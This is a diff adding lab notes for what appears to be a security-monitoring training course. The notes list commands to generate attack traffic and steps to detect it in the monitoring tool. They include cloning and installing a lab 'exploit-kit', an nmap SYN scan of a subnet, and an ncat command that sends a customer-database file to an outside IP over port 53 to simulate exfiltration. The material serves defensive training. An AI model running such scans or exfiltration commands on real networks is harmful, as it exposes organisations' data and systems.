@@ -1,0 +1,90 @@
+Validating Your Wkst1 - ipconfig
+    From the cmd.exe window, type 
+    netstat -bn | findstr /v 127 | findstr /v exe 
+
+Lab 1: Remote Access Breach Using Stolen Credentials
+    
+    Task 2:  Download an exploit-kit
+        pwd
+        cd Downloads
+        git clone https://github.com/sw-dcloud-lab/lab-exploit-kit
+        
+    Task 4:  Install exploit-kit 
+        ./install-exploit-kit 
+        
+    Task 5:  Investigate Security Events Generated in Stealthwatch
+        Insert 198.19.30.36
+        
+Lab 2: Monitoring Trusted 3rd Party and VPN Access
+    
+    Task 2: Initiate attack traffic 
+        nmap -sS -v -n -Pn 198.19.20.0/24 –-disable-arp-ping 
+        
+Lab 3: Historical Traffic Analysis to Identify Threats From Suspect Countries
+    
+    Task 2:  Investigate traffic to random counties
+        198.19.30.36
+        
+        11.	 Define a name for the search by entering “Top Countries Connected to by my Wkst1” in the Search Name field.
+        
+    Task 3:  Identify possible command and control traffic over the past 7 days
+        
+        4.	Type “Top Internal Peers To Non Business Countries by flows” for the Search Name, as shown below.
+            
+    
+        7.	Within Peer Host IP Address type 10.201.3.0/24
+        
+Lab 5: Data Exfiltration
+
+        1.	From Wkst1, open cmd.exe from the Desktop.
+        2.	Change the directory to the Downloads directory using the change directory command: cd       %userprofile%\Downloads in command prompt. 
+        3.	Enter ncat.exe -u --send-only 209.182.184.211 53 < encrypted-customer-DB the 
+
+Lab 6: Detecting Internal Telnet Traffic 
+
+    Create a Custom Security Event to Detect Telnet Traffic Internally
+    
+    1.	Enter Name: .CSE: Telnet Traffic
+        a.	Take note of the period in front of the CSE which will cause the name to sort first
+    2.	(optional) Enter description: Telnet Traffic will violate Security Policy
+    
+Lab 7: Suspicious SMB Traffic
+
+        pwd
+        cd Downloads
+        git clone https://github.com/sw-dcloud-lab/lab-exploit-kit
+        
+Lab 8: Network Segmentation Violations
+
+    Task 2: Demonstrate how host group automation can work with an IPAM to help with segmentation
+        2.	Type pwd to verify you are in the /c/Users/Adminstrator.WKST1 directory  
+        3.	Type cd Downloads and hit Enter 
+        4.	Type git clone https://github.com/sw-dcloud-lab/lab-hga and hit Enter to download 
+        
+    Task 3: Create a policy and test out network segmentation violations
+     
+        1.	Enter Name: .CSE: Unauthorized Connection to Protected Assets
+            a.	Take note of the period in front of the CSE which will cause the name to sort first
+        2.	(optional) Enter description: Unauthorized Connection will violate Security Policy
+    
+Encrypted Traffic Analytics (ETA)
+    enable
+    configure terminal
+    et-analytics
+    ip flow-export destination 192.0.2.1 2055 vrf green
+    exit
+    interface gigabitethernet 0/0/1
+    et-analytics enable
+    end
+    
+    Verifying Encrypted Traffic Analytics
+        show platform hardware qfp active feature et-analytics datapath interface gigabitEthernet 2
+        show platform hardware qfp active feature et-analytics datapath memory
+        show platform hardware qfp active feature et-analytics datapath runtime
+        show platform hardware qfp active feature et-analytics datapath stats export
+        show platform hardware qfp active feature et-analytics datapath stats flow
+        
+
+
+
+
